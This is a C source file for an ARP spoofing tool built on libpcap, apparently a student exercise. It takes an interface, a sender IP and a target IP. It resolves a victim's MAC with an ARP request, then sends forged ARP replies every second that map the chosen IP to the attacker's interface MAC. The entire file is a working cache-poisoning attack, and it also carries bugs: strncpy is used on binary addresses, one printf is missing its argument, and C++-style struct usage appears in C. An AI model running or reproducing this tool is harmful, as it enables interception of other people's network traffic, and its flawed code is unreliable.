#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <pcap.h>
#include <arpa/inet.h>


#define ARP_REQUEST 1
#define ARP_REPLY 2
#define ARP_PACKET_LEN 42

#define PROTO_ARP 0x0806
#define PROTO_IPV4 0x0800

#define ETH_HARDWARE_TYPE 0x01 // HARDWARE_ETH
#define ETH_HARDWARE_SIZE 0x06 //

#define PROTOCOL_ADDR_LEN 0x04 // PROTOCOL

#define BROAD_MAC "\xff\xff\xff\xff\xff\xff"
#define ARP_REQ_MAC "\x00\x00\x00\x00\x00\x00"

#define PROMISCUOUS 1

// For interface
struct ifreq ifr;

// For (sender) real packet!
unsigned char *mac;
unsigned char *dst_mac;

struct ethhdr {
    char dst_mac[6];
    char src_mac[6];
    uint16_t packet_type;
};

struct arphdr {
    uint16_t hardware_addr_type;
    uint16_t protocol_addr_type;
    uint8_t hardware_addr_len;
    uint8_t protocol_addr_len;
    uint16_t opcode;
    char sender_mac[6];
    char sender_ip[4];
    char target_mac[6];
    char target_ip[4];
};

u_char buf[ARP_PACKET_LEN];
pcap_t* handle;

void print_MAC_ADDR(u_char* buf) {
	  printf("%02x:%02x:%02x:%02x:%02x:%02x", buf[0], buf[1], buf[2], buf[3], buf[4], buf[5]);
}

void print_IP_ADDR(u_char* buf) {
	  printf("%d.%d.%d.%d", buf[0], buf[1], buf[2], buf[3]);
}


int send_arp(pcap_t* handle, uint32_t sender_ip, uint32_t target_ip, uint16_t packet_type) {

    ethhdr* eth_p = (ethhdr*) &buf[0];
    arphdr* arp_p = (arphdr*) &buf[14]; // after ethhdr 6 + 6 + 2 -> 14bytes

    if (packet_type == ARP_REQUEST) {
        strncpy(eth_p->dst_mac, BROAD_MAC, 6); 
    } 
    else if (packet_type == ARP_REPLY) {
        strncpy(eth_p->dst_mac, (char*)dst_mac, 6);
    }

    strncpy(eth_p->src_mac, (char*)mac, 6);
    eth_p->packet_type = htons(PROTO_ARP);

    arp_p->hardware_addr_type = htons(ETH_HARDWARE_TYPE);
    arp_p->protocol_addr_type = htons(PROTO_IPV4);
    arp_p->hardware_addr_len = ETH_HARDWARE_SIZE;
    arp_p->protocol_addr_len = PROTOCOL_ADDR_LEN;
    arp_p->opcode = htons(packet_type);

    strncpy(arp_p->sender_mac, (char*)mac, 6);
    strncpy(arp_p->sender_ip, (char*)&sender_ip, 4);
    strncpy(arp_p->target_mac, "", 6);

    if (packet_type == ARP_REQUEST) {
        strncpy(arp_p->target_mac, ARP_REQ_MAC, 6);
    } 
    else if (packet_type == ARP_REPLY) {
        strncpy(arp_p->target_mac, (char*)dst_mac, 6);
    }

    strncpy(arp_p->target_ip, (char*)&target_ip, 4);

    if (packet_type == ARP_REQUEST) {
        printf("REQUEST About ");
        print_IP_ADDR((u_char*)&target_ip);
        printf("\n");
    } 
    else if (packet_type == ARP_REPLY) {
        printf("ARP_REPLY : ");
        print_IP_ADDR((u_char*)&sender_ip);
        printf(" -> ");
        print_MAC_ADDR((u_char*)mac);
        printf("\n");
    }

    if (pcap_sendpacket(handle, buf, ARP_PACKET_LEN) != 0) {
      fprintf(stderr, "send packet err");
      exit(-1);
    }

    return 0;
}

void get_attacker_mac(char *dev) {
    int fd;
    fd = socket(AF_INET, SOCK_DGRAM, 0);

    ifr.ifr_addr.sa_family = AF_INET;

    // IFNAMSIZ = 16
    strncpy(ifr.ifr_name , dev , IFNAMSIZ - 1); 

    ioctl(fd, SIOCGIFHWADDR, &ifr); // ifreq
    mac = (unsigned char *)ifr.ifr_hwaddr.sa_data;	
}


int main(int argc, char* argv[]) {
  
    printf("%s\n, send_arp program by LYH");

    if (argc != 4) {
        printf("Usage : send_arp <interface> <sender_ip> <target_ip>\n");
        printf("ex : send_arp wlan0 192.168.10.2 192.168.10.1\n");
        exit(-1);
    }

    char* dev = argv[1];

    // string to long (ip_addr)
    uint32_t sender_ip = inet_addr(argv[2]);
    uint32_t target_ip = inet_addr(argv[3]);

    get_attacker_mac(dev);

    char errbuf[PCAP_ERRBUF_SIZE];

    // Why 1000??
    handle = pcap_open_live(dev, BUFSIZ, PROMISCUOUS, 1000, errbuf);

    if (handle == NULL) {
        fprintf(stderr, "device open err %s : %s\n", dev, errbuf);
        exit(-1);
    }

    if (send_arp(handle, sender_ip, target_ip, ARP_REQUEST) != 0) {
        fprintf(stderr, "arp_request err\n");
        exit(-1);
    }

    while (1) {
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(handle, &header, &packet);

        if (res == 0) 
            continue;
        if (res == -1 || res == -2)
            break;

        ethhdr* eth_p = (ethhdr*) packet;
        if (eth_p->packet_type != htons(PROTO_ARP))
            continue;

        arphdr* arp_p = (arphdr*) ((uint8_t*)(packet) + 14);
        if (strncmp(arp_p->target_mac,(char*) mac, 6))
            continue;

        dst_mac = (u_char*)arp_p->sender_mac;
        memcpy(dst_mac, &arp_p->sender_mac[0], 6);
    
        break;
    }

    while (1) {
        if (send_arp(handle, sender_ip, target_ip, ARP_REPLY) != 0) {
            fprintf(stderr, "arp_reply err\n");
            exit(-1);
        }
        sleep(1);
    }

    return 0;
}
